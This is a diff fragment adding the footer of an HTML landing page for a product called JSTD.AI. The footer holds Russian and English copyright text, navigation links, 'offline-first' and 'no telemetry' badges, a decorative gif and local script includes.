+                    <p class="footer__copy" data-i18n-html="footer.copy_html">© 2026 JSTD.AI. Все права защищены.<br />Авторская разработка. Нейросетевая модель запатентована.</p>
+                </div>
+                <div class="footer__cols">
+                    <div class="footer__col">
+                        <div class="footer__col-title" data-i18n="footer.col1_title">Продукт</div>
+                        <a href="#cta" data-i18n="footer.col1_1">Скачать</a>
+                        <a href="#docs" data-i18n="footer.col1_2">Документация</a>
+                        <a href="#testimonials" data-i18n="nav.testimonials">Отзывы</a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer__bottom">
+                <span>Built with neural precision. Zero telemetry. Zero cloud.</span>
+                <div class="footer__badges">
+                    <span class="footer__badge">
+                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+                            <path d="M6 1L1 3.5V6C1 8.761 3.239 11 6 11C8.761 11 11 8.761 11 6V3.5L6 1Z" stroke="#00ff88" stroke-width="1" />
+                        </svg>
+                        Offline-first
+                    </span>
+                    <span class="footer__badge">
+                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+                            <path d="M2 6L5 9L10 3" stroke="#00d4ff" stroke-width="1.2" stroke-linecap="square" />
+                        </svg>
+                        No telemetry
+                    </span>
+                    <span class="footer__badge">
+                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+                            <rect x="1" y="1" width="10" height="10" stroke="#a78bfa" stroke-width="1" />
+                            <path d="M4 6H8M6 4V8" stroke="#a78bfa" stroke-width="1" stroke-linecap="square" />
+                        </svg>
+                        MIT-hostile License
+                    </span>
+                </div>
+            </div>
+        </div>
+        <img class="footer-cat" src="./flexing-cat.gif" alt="" aria-hidden="true">
+    </footer>
+
+    <script src="app/i18n.js"></script>
+    <script src="app/main.js"></script>
+</body>
+
+</html>
